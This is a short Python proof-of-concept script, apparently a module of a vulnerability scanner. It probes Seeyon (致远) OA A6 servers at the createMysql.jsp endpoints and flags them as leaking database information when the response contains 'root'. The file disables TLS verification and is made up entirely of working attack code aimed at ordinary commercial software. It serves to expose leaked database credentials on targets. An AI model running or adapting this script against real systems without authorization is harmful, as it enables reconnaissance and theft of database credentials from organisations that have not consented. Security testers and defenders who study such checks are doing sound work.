import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 致远OA_A6_createMysql_数据库敏感信息泄露(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url = urldata + "yyoa/ext/createMysql.jsp"
    vuln_url2 =urldata + "yyoa/createMysql.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(vuln_url, headers=headers, verify=False)
        response2 = requests.get(vuln_url2, headers=headers, verify=False)
        if 'root' in response.text and response.status_code == 200:
            print(Vcolors.RED + "[+] 存在致远OA A6 存在敏感信息泄露,地址为:{}".format(vuln_url) + Vcolors.ENDC)
        elif 'root' in response2.text and response2.status_code == 200:
            print(Vcolors.RED + "[+] 存在致远OA A6 存在敏感信息泄露,地址为:{}".format(vuln_url2) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在致远OA A6 createMysql.jsp 数据库敏感信息泄露漏洞" + Vcolors.ENDC)
    except:
        logging.error("致远OA_A6_createMysql_数据库敏感信息泄露脚本出现异常")



